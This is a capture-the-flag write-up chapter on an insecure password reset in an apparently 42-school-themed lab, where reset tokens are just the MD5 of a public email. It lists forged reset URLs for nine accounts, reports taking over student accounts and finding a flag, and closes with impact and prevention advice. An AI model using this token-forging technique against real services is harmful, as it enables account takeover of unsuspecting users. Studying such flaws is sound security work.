## Chapter 2 — Insecure Password Reset
#password-reset #broken_authentication

Since the reset token is `md5(email)` and the emails of users are public, we can forge any user's account.
`/reset-password?email=user_email&token=<md5(user_email)>` → set new password → log in → access.

| Email                       | Reset URL                                                                                  |
| --------------------------- | ------------------------------------------------------------------------------------------ |
| jdoe@student.42.tech        | `/reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321`        |
| benjamin@student.42.tech    | `/reset-password?email=benjamin@student.42.tech&token=f1640a02eeccb971463836da7300b3ba`    |
| dorian@student.42.tech      | `/reset-password?email=dorian@student.42.tech&token=5dd6bc746080d6133d898694c3f8e9d8`      |
| thanos@student.42.tech      | `/reset-password?email=thanos@student.42.tech&token=7c983aa3101755740f5fc820637a43d9`      |
| anne-sophie@student.42.tech | `/reset-password?email=anne-sophie@student.42.tech&token=5e09b4bd66a79b12d048e3fd98c38536` |
| moderator@42network.fr      | `/reset-password?email=moderator@42network.fr&token=242830db33645deb6e27dd169e557b18`      |
| emilie@42.tech              | `/reset-password?email=emilie@42.tech&token=b63842a0bce50c3b9f15ab9da7e4a175`              |
| wil@42network.fr            | `/reset-password?email=wil@42network.fr&token=6f86521aced663bce813326301245689`            |
| sophie@42.tech              | `/reset-password?email=sophie@42.tech&token=37ffd4d4b39064990bf30271182de7f2`              |

I tried this on all emails. Here is what I got:
- I found the flag in @dorian's account:
	`🚩🚩🚩 FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
- I couldn't access these accounts: @emilie, @wil, @sophie
	*Staff and god accounts use 42 SSO.*

### Impact

Anyone who knows a user's email (all public) can compute their reset token and take over the account — no email access, no interaction needed. This gives full account takeover of every local-auth (student) account. Only the SSO accounts (staff/god) are safe, and only by accident of using a different auth system.

### Prevention

Use a high-entropy, single-use, time-limited token and never use hash of a public value like the email.